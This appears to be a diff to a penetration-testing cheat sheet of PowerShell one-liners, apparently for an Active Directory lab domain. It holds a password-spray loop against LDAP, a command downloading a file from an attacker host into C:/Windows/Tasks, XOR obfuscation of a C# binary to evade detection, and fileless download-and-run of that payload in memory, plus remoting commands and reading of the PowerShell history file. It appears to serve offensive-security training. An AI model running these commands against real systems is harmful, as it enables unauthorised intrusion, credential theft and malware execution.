@@ -25,14 +25,23 @@ iwr http://<LHOST>:8000/<FILENAME> -o C:/Windows/Tasks/<FILENAME>
 $password = "Aa111111"; 
 cat .\users.txt | % { $q = New-Object System.DirectoryServices.DirectoryEntry("LDAP://SEVENKINGDOMS.LOCAL","$_","$password"); if ($q.name -ne $null){Write-Host -ForegroundColor Green "[*] GOTCHA! User:$_ Password:$password"} }
 
-# powershell xor encrypt binary (run on kali with sudo)
+# xor encrypt binary (run on kali with sudo)
 $byteArray = [IO.File]::ReadAllBytes("<PATH>/<CSHARP_BIN>.exe"); $KeyArray = @(52, 86, 66, 23, 61); $keyposition = 0; for ($i = 0; $i -lt $byteArray.count; $i++) { $byteArray[$i] = $byteArray[$i] -bxor $KeyArray[$keyposition]; $keyposition += 1; if ($keyposition -eq $keyArray.Length) { $keyposition = 0 ; } }; [IO.File]::WriteAllBytes("$pwd/<CSHARP>.exe.xored", $byteArray)
 
-# powershell xor decrypt binary into memory (local xor file)
+# xor decrypt binary into memory (local xor file)
 $byteArray = [IO.File]::ReadAllBytes("$pwd\\<CSHARP_BIN>.exe.xored"); $KeyArray = @(52, 86, 66, 23, 61); $keyposition = 0; for ($i = 0; $i -lt $byteArray.count; $i++) { $byteArray[$i] = $byteArray[$i] -bxor $KeyArray[$keyposition]; $keyposition += 1; if ($keyposition -eq $keyArray.Length) { $keyposition = 0 ; } }; [Reflection.Assembly]::Load([byte[]]$byteArray); [<NAMESPACE>.<CLASSNAME>]::Main("<ARGUMENTS>".split(' '));
 
-# powershell xor decrypt binary into memory (fileless)
+# xor decrypt binary into memory (fileless)
 $byteArray = (New-Object System.Net.WebClient).DownloadData("http://<LHOST>/win/<CSHARP_BIN>.exe.xored"); $KeyArray = @(52, 86, 66, 23, 61); $keyposition = 0; for ($i = 0; $i -lt $byteArray.count; $i++) { $byteArray[$i] = $byteArray[$i] -bxor $KeyArray[$keyposition]; $keyposition += 1; if ($keyposition -eq $keyArray.Length) { $keyposition = 0 ; } }; [Reflection.Assembly]::Load([byte[]]$byteArray); [<NAMESPACE>.<CLASSNAME>]::Main("<ARGUMENTS>".split(' '));
 
 $ LHOST: ip -f inet addr show tun0 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p'
 $ BS: echo '\'
+
+# remoting
+Enter-PSSession -ComputerName <REMOTE_COMPUTER_NAME> -Credential <USERNAME>
+
+# remoting JEA
+Enter-PSSession -ComputerName <REMOTE_COMPUTER_NAME> -ConfigurationName <CONFIG_NAME>
+
+# view history
+type $((Get-PSReadlineOption).HistorySavePath)
